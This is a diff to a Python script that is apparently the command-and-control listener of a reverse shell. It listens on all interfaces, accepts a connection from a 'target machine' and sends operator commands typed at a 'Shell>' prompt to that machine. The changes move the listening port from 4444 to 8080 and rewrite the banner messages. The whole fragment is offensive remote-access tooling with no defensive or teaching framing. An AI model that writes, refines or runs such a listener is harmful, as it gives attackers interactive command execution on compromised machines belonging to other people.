@@ -11,18 +11,21 @@ def execute_command(command):
 
 def main():
     SERVER_IP = "0.0.0.0"  # Listen on all interfaces
-    SERVER_PORT = 4444
+    SERVER_PORT = 8080
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((SERVER_IP, SERVER_PORT))
     server.listen(1)
-    print("[+] Waiting for connection...")
+    print("==================================================")
+    print("[+] Listening for income TCP connection on port 8080")
+    print("==================================================")
     
     client_socket, client_address = server.accept()
-    print(f"[+] Target machine connected: {client_address}")
+    print(f"[+] We got a connection from {client_address}")
+    print("==================================================")
     
     while True:
-        command = input("Enter command: ")
+        command = input("Shell> ")
         if command.lower() in ["exit", "quit"]:
             break
         client_socket.send(command.encode())
